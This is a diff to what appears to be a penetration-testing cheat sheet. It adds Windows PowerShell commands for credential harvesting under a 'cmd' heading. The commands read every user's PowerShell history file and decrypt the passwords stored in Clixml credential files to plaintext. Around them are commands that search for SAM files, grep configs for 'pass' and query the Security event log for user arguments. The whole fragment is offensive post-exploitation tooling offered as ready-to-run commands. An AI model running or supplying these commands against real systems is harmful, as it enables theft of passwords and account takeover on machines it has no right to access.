@@ -707,10 +707,24 @@ jq '.nodes[].label'
 
 ### cmd
 ```powershell
-# File
+# File Credential
 Get-Childitem -Path C:\windows.old -Include *SAM -Recurse -force -ErrorAction SilentlyContinue
 
 findstr /SIM /C:"pass" *.txt *.ini *.cfg *.config *.xml
+
+# Powershell History
+(Get-PSReadLineOption).HistorySavePath
+
+foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
+
+# Powershell Passwsord XML
+$credential = Import-Clixml -Path ".\connection.xml"
+$credential.GetNetworkCredential().password
+
+$secureString = $credential.Password
+$plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
+echo $plainTextPassword
+
 
 # Eventlog
 wevtutil qe Security /rd:true /f:text | Select-String "/user"
